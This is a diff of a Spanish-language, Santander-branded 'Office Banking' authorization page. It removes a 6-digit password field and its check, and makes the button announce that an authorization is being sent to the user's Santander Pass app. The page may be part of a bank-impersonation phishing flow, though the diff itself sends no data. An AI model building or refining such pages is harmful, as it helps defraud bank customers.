@@ -28,23 +28,23 @@
       font-size: 15px;
       font-weight: bold;
     }
+    .btn-center {
+      display: block;
+      margin: 20px auto;
+    }
   </style>
 </head>
 <body>
   <div class="login-box">
     <img src="logo-office-banking.png" alt="Office Banking" class="logo">
 
-    <div class="sub-text">Estás solicitando el siguiente producto:</div>
-
     <h1>Autorización requerida</h1>
+    <div class="sub-text">Estás solicitando el siguiente producto:</div>
 
     <!-- Texto normal + monto en cuadro verde -->
     <div class="seleccion-texto" id="seleccionProducto"></div>
 
-    <label for="clave">Clave única de 6 dígitos con su App Santander Pass</label>
-    <input type="password" id="clave" maxlength="6" placeholder="******">
-
-    <button class="btn-santander" id="autorizarBtn">
+    <button class="btn-santander btn-center" id="autorizarBtn">
       AUTORIZAR<span class="bg-arrow"></span>
     </button>
 
@@ -83,12 +83,7 @@
     });
 
     document.getElementById("autorizarBtn").addEventListener("click", function(){
-      const clave = document.getElementById("clave").value;
-      if(clave.length !== 6){
-        document.getElementById("mensaje").innerText = "⚠️ La clave debe tener 6 dígitos.";
-        return;
-      }
-      document.getElementById("mensaje").innerText = "✅ Autorización enviada correctamente.";
+      document.getElementById("mensaje").innerText = "Enviando Autorización a tu Santander Pass...";
     });
   </script>
 </body>
